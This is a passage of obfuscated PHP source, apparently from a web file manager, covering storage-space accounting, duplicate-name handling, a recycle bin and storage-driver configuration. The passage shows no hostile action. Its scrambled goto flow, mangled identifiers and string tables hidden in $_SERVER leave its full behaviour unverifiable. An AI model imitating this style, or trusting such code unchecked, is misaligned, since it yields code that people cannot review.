$d­³–ñßíª[$Bøö‰Äğ Õ[366]] = 0; $A¬†ôê¼ÂÈ = $this->field($f›‘øà÷«â)->where($d­³–ñßíª)->select(); if (!$A¬†ôê¼ÂÈ) { return; } goto BŞ™í¢™É; eéä’‚ãØÜ: foreach ($dŒÌ“±Ûáâ as $aèÁÛæ¶…) { if ($aèÁÛæ¶…[$Bøö‰Äğ Õ[77]] == $aèÁÛæ¶…[$Bøö‰Äğ Õ[2317]]) { continue; } $Dğ§£í›¿°[] = array($Bøö‰Äğ Õ[365], $aèÁÛæ¶…[$Bøö‰Äğ Õ[365]], $Bøö‰Äğ Õ[77], $aèÁÛæ¶…[$Bøö‰Äğ Õ[77]]); } $this->saveAll($Dğ§£í›¿°); goto DÍàÌÂÆ‰Ì; DÍàÌÂÆ‰Ì: } public function userSpaceReset($CëéöÕºˆ” = false) { $aœËŸ¾÷·Ä =& $_SERVER[Ìó]; $Fî­í¬êƒ = $this->where(array($aœËŸ¾÷·Ä[367] => self::TYPE_USER, $aœËŸ¾÷·Ä[451] => $CëéöÕºˆ”, $aœËŸ¾÷·Ä[366] => 0))->sum($aœËŸ¾÷·Ä[77]); Model($aœËŸ¾÷·Ä[469])->userEdit($CëéöÕºˆ”, array($aœËŸ¾÷·Ä[2058] => $Fî­í¬êƒ)); } public function targetSpaceUpdate($eé“ÌŸ„­÷, $b®´†êÜ“‡) { $f˜á‹×‰Û‰ =& $_SERVER[Ìó]; if (!$b®´†êÜ“‡) { return; } if (!in_array($eé“ÌŸ„­÷, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $B…Ñ­ˆêğ = $this->targetSpaceSize($eé“ÌŸ„­÷, $b®´†êÜ“‡); if ($eé“ÌŸ„­÷ == self::TYPE_USER) { Model($f˜á‹×‰Û‰[469])->userEdit($b®´†êÜ“‡, array($f˜á‹×‰Û‰[2058] => $B…Ñ­ˆêğ)); } else { if ($eé“ÌŸ„­÷ == self::TYPE_GROUP) { Model($f˜á‹×‰Û‰[453])->groupEdit($b®´†êÜ“‡, array($f˜á‹×‰Û‰[2058] => $B…Ñ­ˆêğ)); } } } public function targetSpaceSize($aÚÃğĞ“²†, $e›Ùî‹¼ì) { goto e‚¸†Ô¡Îˆ; e‘­ØÙ¼ñ¥: $A¶å“Ú¡¦¥ = floatval($eÄ½Ô‚…Öö[$e±É‹œæìÛ[77]]); $d°İ”°»­ = array($e±É‹œæìÛ[520] => array($e±É‹œæìÛ[478], $e±É‹œæìÛ[465] . $eÄ½Ô‚…Öö[$e±É‹œæìÛ[365]] . $e±É‹œæìÛ[479])); $C‚Œ„Œº‰Ï = Model($e±É‹œæìÛ[390])->field($e±É‹œæìÛ[379])->where($d°İ”°»­)->select(); goto fÂéøß™à; EµÖ´„´: return $A¶å“Ú¡¦¥; goto eìéÙÊ‚Ê£; e‚¸†Ô¡Îˆ: $e±É‹œæìÛ =& $_SERVER[Ìó]; $eÄ½Ô‚…Öö = $this->sourceRoot($aÚÃğĞ“²†, $e›Ùî‹¼ì, !0); if (!$eÄ½Ô‚…Öö) { return 0; } goto e‘­ØÙ¼ñ¥; fÂéøß™à: $C‚Œ„Œº‰Ï = array_to_keyvalue($C‚Œ„Œº‰Ï, $e±É‹œæìÛ[33], $e±É‹œæìÛ[365]); $C‚Œ„Œº‰Ï = array_unique(array_filter($C‚Œ„Œº‰Ï)); if ($C‚Œ„Œº‰Ï) { $d°İ”°»­ = array($e±É‹œæìÛ[379] => array($e±É‹œæìÛ[380], $C‚Œ„Œº‰Ï)); $A¶å“Ú¡¦¥ += floatval($this->where($d°İ”°»­)->sum($e±É‹œæìÛ[77])); } goto EµÖ´„´; eìéÙÊ‚Ê£: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($aÔ÷Óá‚‘›) { return $this->fileTypeProfile($aÔ÷Óá‚‘›, SourceModel::TYPE_USER); } public function groupFileTypeProfile($aõ²Éô¹Ã´) { return $this->fileTypeProfile($aõ²Éô¹Ã´, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Bš¯¿Ãƒ§Á, $fÔ‡Ÿ§·£) { goto Eìó“ÊİÄñ; D‹ÃÃíİò: if ($e«—ÊËöœ) { return $e«—ÊËöœ; } $aäß“·•Í¦ = array($B°Œã²¸Õ[513] => 0); if ($Bš¯¿Ãƒ§Á != !1) { $aäß“·•Í¦[$B°Œã²¸Õ[451]] = $Bš¯¿Ãƒ§Á; $aäß“·•Í¦[$B°Œã²¸Õ[367]] = $fÔ‡Ÿ§·£; } goto E¥ŸÜŸ†È; bÒò¼µ¥×å: foreach ($D±Éà³ô as $B¡È…İ„õ“ => $A÷¶Ùª“¢í) { $aäß“·•Í¦[$B°Œã²¸Õ[368]] = $this->fileTypeWhere($B¡È…İ„õ“); $B¸ÖÊ…Äí‡[$B¡È…İ„õ“] = array($B°Œã²¸Õ[2320] => $A÷¶Ùª“¢í[$B°Œã²¸Õ[28]], $B°Œã²¸Õ[2321] => $this->where($aäß“·•Í¦)->count(), $B°Œã²¸Õ[515] => $this->where($aäß“·•Í¦)->sum($B°Œã²¸Õ[77])); } Cache::set($D÷¹¶É ‘ª, $B¸ÖÊ…Äí‡, 1200); return $B¸ÖÊ…Äí‡; goto Bº†°ˆÑİœ; E¥ŸÜŸ†È: $B¸ÖÊ…Äí‡ = array(); $B¸ÖÊ…Äí‡[$B°Œã²¸Õ[2319]] = array($B°Œã²¸Õ[2320] => LNG($B°Œã²¸Õ[2319]), $B°Œã²¸Õ[2321] => $this->where($aäß“·•Í¦)->count(), $B°Œã²¸Õ[515] => $this->where($aäß“·•Í¦)->sum($B°Œã²¸Õ[77])); $D±Éà³ô = KodIO::fileTypeList(); goto bÒò¼µ¥×å; Eìó“ÊİÄñ: $B°Œã²¸Õ =& $_SERVER[Ìó]; $D÷¹¶É ‘ª = $B°Œã²¸Õ[2318] . $Bš¯¿Ãƒ§Á . $B°Œã²¸Õ[70] . $fÔ‡Ÿ§·£; $e«—ÊËöœ = Cache::get($D÷¹¶É ‘ª); goto D‹ÃÃíİò; Bº†°ˆÑİœ: } public function fileNameExist($F“ŒšÒ„õ”, $eÒš¨÷¬ñ) { $f¬¬ŞÜ½Ñ =& $_SERVER[Ìó]; $dÔöì¾Äî½ = $this->childList($F“ŒšÒ„õ”); foreach ($dÔöì¾Äî½ as $DğŠô±ÂŒä) { if ($DğŠô±ÂŒä[$f¬¬ŞÜ½Ñ[28]] == $eÒš¨÷¬ñ) { return $DğŠô±ÂŒä[$f¬¬ŞÜ½Ñ[365]]; } } return !1; } public function childList($DçÆ–ŠÕæé) { goto d‘ÜÂÄÏ¥Ù; d‘ÜÂÄÏ¥Ù: $F“İ›ã®´ß =& $_SERVER[Ìó]; $Fˆ‘Èâ¸£Ê = $F“İ›ã®´ß[2298] . $DçÆ–ŠÕæé; if (isset(self::$cacheChildList[$Fˆ‘Èâ¸£Ê])) { return self::$cacheChildList[$Fˆ‘Èâ¸£Ê]; } goto A‰°ç®´Ôæ; A‰°ç®´Ôæ: $B±ØÍ¼‚Š = array($F“İ›ã®´ß[456] => intval($DçÆ–ŠÕæé), $F“İ›ã®´ß[392] => 0); $FÍ¢Ï—£¨˜ = $this->where($B±ØÍ¼‚Š)->select(); $FÍ¢Ï—£¨˜ = $FÍ¢Ï—£¨˜ ? $FÍ¢Ï—£¨˜ : array(); goto aÓ›öÊÂÚ; aÓ›öÊÂÚ: self::$cacheChildList[$Fˆ‘Èâ¸£Ê] = $FÍ¢Ï—£¨˜; foreach ($FÍ¢Ï—£¨˜ as $BÂ¡êòììƒ) { $Fˆ‘Èâ¸£Ê = $F“İ›ã®´ß[405] . $BÂ¡êòììƒ[$F“İ›ã®´ß[365]]; self::$cacheSourceInfo[$Fˆ‘Èâ¸£Ê] = $BÂ¡êòììƒ; } return $FÍ¢Ï—£¨˜; goto EœÜœ¤¢ßÜ; EœÜœ¤¢ßÜ: } public function fileNameAuto($F®‰ôçä, $DŞ›Ÿ–ÜçÜ, $cÚê¯ïÛ¡Ê = REPEAT_RENAME, $c£äŞ„Š‡ = false) { $Bœ«Ş­ÒÂ… =& $_SERVER[Ìó]; $Cóì²‚ŒŒ– = $this->childList($F®‰ôçä); $c£Ç‹È¿ƒ„ = array_to_keyvalue($Cóì²‚ŒŒ–, $Bœ«Ş­ÒÂ…[33], $Bœ«Ş­ÒÂ…[28]); return $this->fileNameAutoGet($c£Ç‹È¿ƒ„, $DŞ›Ÿ–ÜçÜ, $cÚê¯ïÛ¡Ê, $c£äŞ„Š‡); } public function fileNameAutoGet($e»á´®¬¬‹, $bÎ…ëÓ˜Æİ, $e²Öº©Â¦ã, $fâ¿†ãàé‹) { $DÍÀ­ãÏ =& $_SERVER[Ìó]; if ($e²Öº©Â¦ã == REPEAT_REPLACE || !$e»á´®¬¬‹ || !in_array_not_case($bÎ…ëÓ˜Æİ, $e»á´®¬¬‹) || $fâ¿†ãàé‹ && $e²Öº©Â¦ã != REPEAT_RENAME_FOLDER) { return $bÎ…ëÓ˜Æİ; } if ($e²Öº©Â¦ã == REPEAT_SKIP) { return !1; } $f¨Õ»ÈÌ…× = $DÍÀ­ãÏ[91] . get_path_ext($bÎ…ëÓ˜Æİ); $f¨Õ»ÈÌ…× = $f¨Õ»ÈÌ…× == $DÍÀ­ãÏ[91] || $fâ¿†ãàé‹ ? $DÍÀ­ãÏ[33] : $f¨Õ»ÈÌ…×; for ($Bù£‰Ğ’Øí = 1; $Bù£‰Ğ’Øí <= count($e»á´®¬¬‹) + 1; $Bù£‰Ğ’Øí++) { $dÌ¼šØªË‹ = substr($bÎ…ëÓ˜Æİ, 0, strlen($bÎ…ëÓ˜Æİ) - strlen($f¨Õ»ÈÌ…×)); $a‰…ÒÆ®½œ = $dÌ¼šØªË‹ . "\x28{$Bù£‰Ğ’Øí}\x29{$f¨Õ»ÈÌ…×}"; if (!in_array_not_case($a‰…ÒÆ®½œ, $e»á´®¬¬‹)) { return $a‰…ÒÆ®½œ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\143\x65\x5f\x72\x65\143\x79\143\x6c\145"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\155\145", "\x74\151\x6d\x65", "\x69\x6e\x73\145\x72\x74", "\146\x75\156\x63\164\x69\157\x6e")); public function listData($Aá±ˆï”İ = false) { $FÆŞ¼ÎÉÑ =& $_SERVER[Ìó]; $Aá±ˆï”İ = $Aá±ˆï”İ ? $Aá±ˆï”İ : USER_ID; $bŸ›ÄÉ‚ù’ = $this->where(array($FÆŞ¼ÎÉÑ[1400] => $Aá±ˆï”İ))->select(); return array_to_keyvalue($bŸ›ÄÉ‚ù’, $FÆŞ¼ÎÉÑ[33], $FÆŞ¼ÎÉÑ[365]); } public function moveToRecycle($e˜´Çö·”„) { goto C‘Šã‚Ï³Ğ; A«‡¶¬ƒ°İ: if (!$dÛ«Ü®’µ± || $dÛ«Ü®’µ±[$bÃ¢‡º»º¿[392]] == $bÃ¢‡º»º¿[83]) { return; } $b‹øæíä¨  = array($bÃ¢‡º»º¿[379] => $e˜´Çö·”„, $bÃ¢‡º»º¿[1400] => USER_ID, $bÃ¢‡º»º¿[516] => $dÛ«Ü®’µ±[$bÃ¢‡º»º¿[367]], $bÃ¢‡º»º¿[517] => $dÛ«Ü®’µ±[$bÃ¢‡º»º¿[451]], $bÃ¢‡º»º¿[520] => $dÛ«Ü®’µ±[$bÃ¢‡º»º¿[454]]); $this->add($b‹øæíä¨ ); goto cæºØ”¢çè; C‘Šã‚Ï³Ğ: $bÃ¢‡º»º¿ =& $_SERVER[Ìó]; $f™›½À»–‘ = Model($bÃ¢‡º»º¿[1106]); $dÛ«Ü®’µ± = $f™›½À»–‘->sourceInfo($e˜´Çö·”„); goto A«‡¶¬ƒ°İ; cæºØ”¢çè: $this->recycleMove($e˜´Çö·”„, 1); if ($dÛ«Ü®’µ±[$bÃ¢‡º»º¿[366]] == $bÃ¢‡º»º¿[83]) { $cŸ«ÙÆ÷øÃ = array($bÃ¢‡º»º¿[520] => array($bÃ¢‡º»º¿[478], $dÛ«Ü®’µ±[$bÃ¢‡º»º¿[454]] . $e˜´Çö·”„ . $bÃ¢‡º»º¿[479])); $f™›½À»–‘->where($cŸ«ÙÆ÷øÃ)->setField($bÃ¢‡º»º¿[392], 1); } goto D¾ñ¥ŠÁ”; D¾ñ¥ŠÁ”: } public function clear() { $this->remove(!1); } public function remove($E§İç¸áˆ’ = false) { goto báÇáœ†¾; báÇáœ†¾: $b¬èã‹—« =& $_SERVER[Ìó]; $còÇµ‘„õß = Model($b¬èã‹—«[1106]); $b˜ÜÈ–æÏÌ = $this->listData(); goto E–ÕÅ¤‰Êˆ; E–ÕÅ¤‰Êˆ: $E§İç¸áˆ’ = $E§İç¸áˆ’ === !1 ? !1 : $E§İç¸áˆ’; $DãôÃÏÑÙ¬ = array(); foreach ($b˜ÜÈ–æÏÌ as $bÙ‹¨Õ­™ó) { if ($E§İç¸áˆ’ != !1 && !in_array($bÙ‹¨Õ­™ó, $E§İç¸áˆ’)) { continue; } $còÇµ‘„õß->remove($bÙ‹¨Õ­™ó, !1); $e¸Ô‰Ö­œ¦ = $this->where(array($b¬èã‹—«[365] => $bÙ‹¨Õ­™ó))->find(); $Bë‡ÊíóáÔ = $e¸Ô‰Ö­œ¦[$b¬èã‹—«[367]] . $b¬èã‹—«[70] . $e¸Ô‰Ö­œ¦[$b¬èã‹—«[451]]; $DãôÃÏÑÙ¬[$Bë‡ÊíóáÔ] = array($b¬èã‹—«[516] => $e¸Ô‰Ö­œ¦[$b¬èã‹—«[367]], $b¬èã‹—«[451] => $e¸Ô‰Ö­œ¦[$b¬èã‹—«[451]]); $this->where(array($b¬èã‹—«[365] => $bÙ‹¨Õ­™ó))->delete(); } goto f½Ë©ƒó; f½Ë©ƒó: foreach ($DãôÃÏÑÙ¬ as $Ašš‡¦ò) { $còÇµ‘„õß->targetSpaceUpdate($Ašš‡¦ò[$b¬èã‹—«[367]], $Ašš‡¦ò[$b¬èã‹—«[451]]); } goto C¾ÉÌŠšÇ; C¾ÉÌŠšÇ: } public function restore($aó¯äŸ¨Ö‘ = false) { goto a‚”ÜñÖ·³; cÓ”ï³íñš: $aó¯äŸ¨Ö‘ = $aó¯äŸ¨Ö‘ == !1 ? !1 : $aó¯äŸ¨Ö‘; if (!$cÀôøò×Õ) { return !0; } $cÓ¥¦â½àà = array(); goto f•öÖ·Œ…Ç; a‚”ÜñÖ·³: $dÛ§´ä•ôë =& $_SERVER[Ìó]; $F°ô÷Íğ‰£ = Model($dÛ§´ä•ôë[1106]); $cÀôøò×Õ = $this->listData(); goto cÓ”ï³íñš; f•öÖ·Œ…Ç: foreach ($cÀôøò×Õ as $BÕî‘µÅ¶°) { goto Cïù—¾ÊÒ™; Cïù—¾ÊÒ™: if ($aó¯äŸ¨Ö‘ != !1 && !in_array($BÕî‘µÅ¶°, $aó¯äŸ¨Ö‘)) { continue; } $FÁóÎŸ™Ş¨ = $F°ô÷Íğ‰£->sourceInfo($BÕî‘µÅ¶°); $E£ÄŠó‡ = $F°ô÷Íğ‰£->sourceInfo($FÁóÎŸ™Ş¨[$dÛ§´ä•ôë[456]]); goto a•´ğ‚ˆš„; DÛÃ®œøÊ˜: $cÓ¥¦â½àà[] = $FÁóÎŸ™Ş¨[$dÛ§´ä•ôë[456]]; if ($FÁóÎŸ™Ş¨[$dÛ§´ä•ôë[366]] == $dÛ§´ä•ôë[83]) { $cÓ¥¦â½àà[] = $BÕî‘µÅ¶°; } $F°ô÷Íğ‰£->lockMoveEnd($BÕî‘µÅ¶°); goto fÄ­‘Ì©áÄ; E¦¬ó½‘¹Ç: if ($FÁóÎŸ™Ş¨[$dÛ§´ä•ôë[366]] == $dÛ§´ä•ôë[83]) { $eÊÜ·ÅÎˆ = array($dÛ§´ä•ôë[520] => array($dÛ§´ä•ôë[478], $FÁóÎŸ™Ş¨[$dÛ§´ä•ôë[454]] . $BÕî‘µÅ¶° . $dÛ§´ä•ôë[479])); $F°ô÷Íğ‰£->where($eÊÜ·ÅÎˆ)->setField($dÛ§´ä•ôë[392], 0); $this->restoreFolderChildren($BÕî‘µÅ¶°, $cÀôøò×Õ); } $this->where(array($dÛ§´ä•ôë[365] => $BÕî‘µÅ¶°))->delete(); $F°ô÷Íğ‰£->folderSizeReset($FÁóÎŸ™Ş¨[$dÛ§´ä•ôë[456]]); goto DÛÃ®œøÊ˜; a•´ğ‚ˆš„: if ($E£ÄŠó‡[$dÛ§´ä•ôë[392]] == $dÛ§´ä•ôë[83]) { continue; } $F°ô÷Íğ‰£->lockMoveStart($BÕî‘µÅ¶°); $this->recycleMove($BÕî‘µÅ¶°, 0); goto E¦¬ó½‘¹Ç; fÄ­‘Ì©áÄ: } $F°ô÷Íğ‰£->updateModifyTime($cÓ¥¦â½àà); goto bÎ©’¶İ•Ú; bÎ©’¶İ•Ú: } private function restoreFolderChildren($Dó¬Š¾‡, $BÏ³˜õé®) { goto C ÚóËŠµ¾; AáÕ¤éé¾: foreach ($BÏ³˜õé® as $CÌÖ°œùÈ) { if ($CÌÖ°œùÈ == $Dó¬Š¾‡) { continue; } if (!$E±­Ó‡Üˆ->isParentOf($Dó¬Š¾‡, $CÌÖ°œùÈ)) { continue; } $CÑ¡ÛŒøê = $E±­Ó‡Üˆ->sourceInfo($CÌÖ°œùÈ); if ($CÑ¡ÛŒøê[$f†¯ÊÉå˜‹[366]] == $f†¯ÊÉå˜‹[83]) { $AÊÔæÓ÷­¿[] = array($f†¯ÊÉå˜‹[520] => array($f†¯ÊÉå˜‹[478], $CÑ¡ÛŒøê[$f†¯ÊÉå˜‹[454]] . $CÌÖ°œùÈ . $f†¯ÊÉå˜‹[479])); } else { $AÊÔæÓ÷­¿[$f†¯ÊÉå˜‹[365]][1][] = $CÌÖ°œùÈ; } } if (!$AÊÔæÓ÷­¿[$f†¯ÊÉå˜‹[365]][1]) { unset($AÊÔæÓ÷­¿[$f†¯ÊÉå˜‹[365]]); } if (!$AÊÔæÓ÷­¿) { return; } goto dÚâ…Ÿ‘„; dÚâ…Ÿ‘„: $AÊÔæÓ÷­¿[$f†¯ÊÉå˜‹[365]][1] = array_unique($AÊÔæÓ÷­¿[$f†¯ÊÉå˜‹[365]][1]); $AÊÔæÓ÷­¿[$f†¯ÊÉå˜‹[912]] = $f†¯ÊÉå˜‹[2152]; $E±­Ó‡Üˆ->where($AÊÔæÓ÷­¿)->setField($f†¯ÊÉå˜‹[392], 1); goto e™±ª„†«; C ÚóËŠµ¾: $f†¯ÊÉå˜‹ =& $_SERVER[Ìó]; $E±­Ó‡Üˆ = Model($f†¯ÊÉå˜‹[1106]); $AÊÔæÓ÷­¿ = array($f†¯ÊÉå˜‹[365] => array($f†¯ÊÉå˜‹[7], array())); goto AáÕ¤éé¾; e™±ª„†«: } private function recycleMove($c‚öè­ç˜õ, $B§õ«„·Ã‰ = 1) { $bĞº¦ƒ°Ã =& $_SERVER[Ìó]; $FˆŸçë¸µß = Model($bĞº¦ƒ°Ã[1106]); $BğÁÃÄ”ä… = Model($bĞº¦ƒ°Ã[2322]); $C·ô™®§Ï„ = array($bĞº¦ƒ°Ã[365] => $c‚öè­ç˜õ); if ($B§õ«„·Ã‰) { $FˆŸçë¸µß->where($C·ô™®§Ï„)->setField($bĞº¦ƒ°Ã[392], 1); $BğÁÃÄ”ä…->eventRecycle($c‚öè­ç˜õ, $bĞº¦ƒ°Ã[2323]); } else { $Bà“¦‘ôí = $FˆŸçë¸µß->where($C·ô™®§Ï„)->find(); $AÈá†À»– = $Bà“¦‘ôí[$bĞº¦ƒ°Ã[366]] == $bĞº¦ƒ°Ã[83]; $a÷ŒãîÑö¥ = $FˆŸçë¸µß->fileNameAuto($Bà“¦‘ôí[$bĞº¦ƒ°Ã[456]], $Bà“¦‘ôí[$bĞº¦ƒ°Ã[28]], REPEAT_RENAME_FOLDER, $AÈá†À»–); if ($a÷ŒãîÑö¥ != $Bà“¦‘ôí[$bĞº¦ƒ°Ã[28]]) { $FˆŸçë¸µß->rename($c‚öè­ç˜õ, $a÷ŒãîÑö¥); } $FˆŸçë¸µß->where($C·ô™®§Ï„)->setField($bĞº¦ƒ°Ã[392], 0); $BğÁÃÄ”ä…->eventRecycle($c‚öè­ç˜õ, $bĞº¦ƒ°Ã[2324]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\x73\x74\157\162\141\x67\x65\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\163\x69\x7a\145\115\141\x78", "\163\171\163\164\x65\x6d", "\144\x65\x66\141\x75\x6c\x74", "\x64\x72\151\x76\145\x72", "\143\x6f\156\146\x69\x67"); public function listData($B‹Ó¼§¯ôâ = false, $f—öòãè˜§ = "\x6d\157\144\x69\146\x79\x54\151\155\145", $f‡éí×½ = false) { goto bÃö…†‡˜; bÃö…†‡˜: $C—Ğáã­Ò =& $_SERVER[Ìó]; $bö½–ÃŸ‹¨ = parent::listData($B‹Ó¼§¯ôâ, $f—öòãè˜§, $f‡éí×½); if ($B‹Ó¼§¯ôâ) { return $bö½–ÃŸ‹¨; } goto f†Ø÷²Š³Ì; f†Ø÷²Š³Ì: foreach ($bö½–ÃŸ‹¨ as $bÃĞÇİ² => $BÈÑÂ¶µÅÆ) { unset($bö½–ÃŸ‹¨[$bÃĞÇİ²][$C—Ğáã­Ò[6]]); $bö½–ÃŸ‹¨[$bÃĞÇİ²][$C—Ğáã­Ò[2058]] = 0; } $bÍ¶»˜á­¢ = array_to_keyvalue($bö½–ÃŸ‹¨, $C—Ğáã­Ò[33], $C—Ğáã­Ò[363]); $this->_listAppendSize($bö½–ÃŸ‹¨, $bÍ¶»˜á­¢); goto AÚÔÏÎ¨Õ; AÚÔÏÎ¨Õ: return $bö½–ÃŸ‹¨; goto CíÌ‰¦‰­è; CíÌ‰¦‰­è: } public function _listAppendSize(&$e«ã»óÁ¡™, $aòé‘¨™«Æ) { $AÏ ™£±ö³ =& $_SERVER[Ìó]; $F¨¼ÒâíÚ = $AÏ ™£±ö³[2325] . implode($AÏ ™£±ö³[47], $aòé‘¨™«Æ) . $AÏ ™£±ö³[2326]; $CÌÜãå Ñ = Model($AÏ ™£±ö³[715])->query($F¨¼ÒâíÚ); $CÌÜãå Ñ = array_to_keyvalue($CÌÜãå Ñ, $AÏ ™£±ö³[363], $AÏ ™£±ö³[77]); foreach ($e«ã»óÁ¡™ as $cÖ•”Ê…¹š => $A³Ì©ó‚›) { $e«ã»óÁ¡™[$cÖ•”Ê…¹š][$AÏ ™£±ö³[2058]] = isset($CÌÜãå Ñ[$A³Ì©ó‚›[$AÏ ™£±ö³[363]]]) ? $CÌÜãå Ñ[$A³Ì©ó‚›[$AÏ ™£±ö³[363]]] : 0; } } public function getConfig($fÃÎÙ±¬õ¨) { $f¸ºÉ¹Ç = parent::listData($fÃÎÙ±¬õ¨); return json_decode($f¸ºÉ¹Ç[$_SERVER[Ìó][6]], !0); } public function update($FÊí—£øùÛ, $EÖ‰ªÂ†Ñ) { goto d›ÍÑ¦‡¶; d›ÍÑ¦‡¶: $cÃö‰‡õ® =& $_SERVER[Ìó]; $Eƒøˆ£Ø­¶ = $EÖ‰ªÂ†Ñ[$cÃö‰‡õ®[28]]; $cè£³Š”Âç = array_to_keyvalue(parent::listData(), $cÃö‰‡õ®[28]); goto b—ëÄÓÒ; b—ëÄÓÒ: if (isset($cè£³Š”Âç[$Eƒøˆ£Ø­¶]) && $cè£³Š”Âç[$Eƒøˆ£Ø­¶][$cÃö‰‡õ®[363]] != $FÊí—£øùÛ) { return !1; } if (isset($EÖ‰ªÂ†Ñ[$cÃö‰‡õ®[2327]]) && $EÖ‰ªÂ†Ñ[$cÃö‰‡õ®[2327]] == $cÃö‰‡õ®[83]) { $this->checkConfig($EÖ‰ªÂ†Ñ); } unset($EÖ‰ªÂ†Ñ[$cÃö‰‡õ®[2327]]); goto C¡Ó‘¢¾‡; C¡Ó‘¢¾‡: $c¶×Ì¾“³¬ = parent::update($FÊí—£øùÛ, $EÖ‰ªÂ†Ñ); if ($c¶×Ì¾“³¬ && $EÖ‰ªÂ†Ñ[$cÃö‰‡õ®[34]]) { foreach ($cè£³Š”Âç as $Féìº®Œ·–) { if ($Féìº®Œ·–[$cÃö‰‡õ®[34]] && $Féìº®Œ·–[$cÃö‰‡õ®[363]] != $FÊí—£øùÛ) { parent::update($Féìº®Œ·–[$cÃö‰‡õ®[363]], array($cÃö‰‡õ®[34] => 0)); } } } return $c¶×Ì¾“³¬; goto D†¦ä°¾ö‚; D†¦ä°¾ö‚: } public function add($A«²Úøœ—”) { goto Bæíˆ£ñø»; Bæíˆ£ñø»: $A¥‚ĞØÕ¯Å =& $_SERVER[Ìó]; $b†Óé‡¨½ = array_to_keyvalue(parent::listData(), $A¥‚ĞØÕ¯Å[28]); if (isset($b†Óé‡¨½[$A«²Úøœ—”[$A¥‚ĞØÕ¯Å[28]]])) { return !1; } goto E‚Ë£Ï­‡²; E‚Ë£Ï­‡²: $this->checkConfig($A«²Úøœ—”); $B‚æ£ÒãÓÅ = parent::insert($A«²Úøœ—”); if ($B‚æ£ÒãÓÅ && $A«²Úøœ—”[$A¥‚ĞØÕ¯Å[34]]) { foreach ($b†Óé‡¨½ as $a´ÕÁÕ¤³‘) { if ($a´ÕÁÕ¤³‘[$A¥‚ĞØÕ¯Å[34]]) { parent::update($a´ÕÁÕ¤³‘[$A¥‚ĞØÕ¯Å[363]], array($A¥‚ĞØÕ¯Å[34] => 0)); } } } goto b…ëá×ì÷Î; b…ëá×ì÷Î: return $B‚æ£ÒãÓÅ; goto f–…ññÁÄ¢; f–…ññÁÄ¢: } public function checkConfig(&$cÅ¢Â˜¿ºã) { goto d‡‘¥æÜ; e¹ğ¿‡ä–›: $cù‡ª¯Éè = $B´áÇ„Æ->getPath($FØğæ¶Ä‚ . $C«ôŞë‹î[1954]); if (!$B´áÇ„Æ->mkfile($cù‡ª¯Éè)) { show_json(LNG($C«ôŞë‹î[2328]), !1); } $aİ•ÎÉ›œÔ[$C«ôŞë‹î[1020]] = $FØğæ¶Ä‚; goto Aœù·Ÿ—Öø; CÂ‘Œ¯®: foreach ($aİ•ÎÉ›œÔ as $bé†÷‡Œ’Å => $D‹·ì•åÏì) { $aİ•ÎÉ›œÔ[$bé†÷‡Œ’Å] = trim($D‹·ì•åÏì); } $FØğæ¶Ä‚ = rtrim($aİ•ÎÉ›œÔ[$C«ôŞë‹î[1020]], $C«ôŞë‹î[8]) . $C«ôŞë‹î[8]; $BÂÔÚµŠ¾ß = $this->driverType($f¦…Ó„²Šè); goto E“´ååŒ¸Ğ; d‡‘¥æÜ: $C«ôŞë‹î =& $_SERVER[Ìó]; $f¦…Ó„²Šè = strtolower($cÅ¢Â˜¿ºã[$C«ôŞë‹î[90]]); $aİ•ÎÉ›œÔ = json_decode_force($cÅ¢Â˜¿ºã[$C«ôŞë‹î[6]]); goto CÂ‘Œ¯®; Aœù·Ÿ—Öø: $cÅ¢Â˜¿ºã[$C«ôŞë‹î[6]] = json_encode($aİ•ÎÉ›œÔ); $cÅ¢Â˜¿ºã[$C«ôŞë‹î[90]] = $BÂÔÚµŠ¾ß; return !0; goto EÀøÌ¿÷º; E“´ååŒ¸Ğ: $a·ì©ÅÊ = $C«ôŞë‹î[71] . $BÂÔÚµŠ¾ß; $B´áÇ„Æ = new $a·ì©ÅÊ($aİ•ÎÉ›œÔ); if (in_array($f¦…Ó„²Šè, $B´áÇ„Æ->objectDriver)) { if (!$B´áÇ„Æ->isBucketCors() && !$B´áÇ„Æ->setBucketCors()) { $E¸¼¤Ã•Ø = LNG($C«ôŞë‹î[2328]); $E¸¼¤Ã•Ø .= $C«ôŞë‹î[2329] . LNG($C«ôŞë‹î[2330]); show_json($E¸¼¤Ã•Ø, !1); } } goto e¹ğ¿‡ä–›; EÀøÌ¿÷º: } private function driverType($e©Åø¢®) { $c—æ«Á¬Ö¹ =& $_SERVER[Ìó]; $bË˜â£¦Š = array($c—æ«Á¬Ö¹[101] => $c—æ«Á¬Ö¹[2331], $c—æ«Á¬Ö¹[58] => $c—æ«Á¬Ö¹[2332], $c—æ«Á¬Ö¹[64] => $c—æ«Á¬Ö¹[2333]); if (isset($bË˜â£¦Š[$e©Åø¢®])) { return $bË˜â£¦Š[$e©Åø¢®]; } return strtoupper($e©Åø¢®); } public function driverListSystem() { $C¼•ÔŠĞÔ =& $_SERVER[Ìó]; $Eßˆ˜„¹‹¿ = parent::listData(); $F²ĞÓ¹´£¯ = array(); foreach ($Eßˆ˜„¹‹¿ as $F¶ñÚ¨¿¬) { unset($F¶ñÚ¨¿¬[$C¼•ÔŠĞÔ[183]], $F¶ñÚ¨¿¬[$C¼•ÔŠĞÔ[106]]); $F¶ñÚ¨¿¬[$C¼•ÔŠĞÔ[6]] = json_decode_force($F¶ñÚ¨¿¬[$C¼•ÔŠĞÔ[6]]); $F²ĞÓ¹´£¯[] = $F¶ñÚ¨¿¬; } return $F²ĞÓ¹´£¯; } public function defaultDriver() { $BÂà£”¸·Ã =& $_SERVER[Ìó]; $f˜Åá‡‹· = parent::listData(); $EºÄºîŸÄˆ = array_filter_by_field($f˜Åá‡‹·, $BÂà£”¸·Ã[34], 1); $EºÄºîŸÄˆ = $EºÄºîŸÄˆ[0]; if ($EºÄºîŸÄˆ) { $EºÄºîŸÄˆ[$BÂà£”¸·Ã[6]] = json_decode($EºÄºîŸÄˆ[$BÂà£”¸·Ã[6]], !0); } return $EºÄºîŸÄˆ; } public function driverInfo($fÒ½šæÌË®) { $BâˆÔšÎ‰ =& $_SERVER[Ìó]; 